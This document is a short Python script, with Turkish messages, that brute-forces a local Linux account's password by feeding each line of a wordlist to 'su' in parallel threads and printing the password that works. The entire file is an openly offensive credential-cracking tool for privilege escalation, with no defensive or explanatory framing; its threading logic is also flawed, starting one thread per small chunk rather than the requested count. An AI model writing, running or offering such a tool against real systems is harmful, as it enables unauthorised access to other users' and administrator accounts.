from subprocess import run, CalledProcessError
from threading import Thread
from sys import argv

class PasswordCracker:
    def __init__(self, username, threads, wordlist):
        self.username = username
        self.threads = threads
        self.wordlist = wordlist
        self.password_cracked = False

    def check_login(self, password):
        try:
            process = run(["su", self.username], input=password, capture_output=True, text=True)

            if process.returncode == 0:
                print(f"Şifre: {password}")
                self.password_cracked = True 
        except CalledProcessError:
            print("Bir hata oluştu.")

    def process_passwords(self, passwords):
        for password in passwords:
            if self.password_cracked:
                break
            self.check_login(password)

    def run_cracker(self):
        with open(self.wordlist, "r", encoding="latin1") as file:
            passwords = file.read().splitlines()

        split_passwords = [passwords[i:i + self.threads] for i in range(0, len(passwords), self.threads)]

        threads = []
        for password_chunk in split_passwords:
            thread = Thread(target=self.process_passwords, args=(password_chunk,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

if __name__ == "__main__":
    if len(argv) == 4:
        username = argv[1]
        threads = int(argv[2])
        wordlist = argv[3]
    else:
        print(f"Kullanım: python3 {argv[0]} [username] [threads] [wordlist]")
        exit(0)

    sucrack = PasswordCracker(username, threads, wordlist)
    sucrack.run_cracker()
